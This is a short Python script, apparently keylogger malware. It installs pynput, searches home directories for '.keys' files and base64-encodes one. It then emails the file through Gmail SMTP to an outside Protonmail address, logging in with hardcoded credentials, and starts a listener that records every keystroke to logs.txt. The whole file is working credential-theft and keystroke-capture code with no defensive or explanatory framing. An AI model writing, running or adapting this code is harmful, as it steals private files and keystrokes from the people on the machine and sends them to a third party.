import os
os.system('pip install pynput && pip install logging')

from pynput.keyboard import Key, Listener
import logging
import glob
import smtplib
import base64

for filename in glob.iglob('/home/**/*.keys', recursive=True):
    print(filename)

filename = filename

fo = open(filename, "rb")
filecontent = fo.read()
encodedcontent = base64.b64encode(filecontent)

sender = 'webmaster@tutorialpoint.com'
receiver = 'blackhatcourse2020@protonmail.com'

marker = "AUNIQUEMARKER"

body = """
This is a test email to send an attachement.
"""
part1 = """From: From Person <me@fromdomain.net>
To: To Person <amrood.admin@gmail.com>
Subject: Sending Attachement
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=%s
--%s
""" % (marker, marker)

part2 = """Content-Type: text/plain
Content-Transfer-Encoding:8bit

%s
--%s
""" % (body, marker)

part3 = """Content-Type: multipart/mixed; name=\"%s\"
Content-Transfer-Encoding:base64
Content-Disposition: attachment; filename=%s

%s
--%s--
""" % (filename, filename, encodedcontent, marker)
message = part1 + part2 + part3
sender_address = 'spprtpplcm@gmail.com '
sender_pass = 'spprtpplcm@54321'
session = smtplib.SMTP('smtp.gmail.com', 587)
session.starttls()
session.login(sender_address, sender_pass)
session.sendmail(sender, receiver, message)
session.quit()
print('Mail Sent')


log_dir = ""

logging.basicConfig(filename=(log_dir + "logs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
     listener.join()

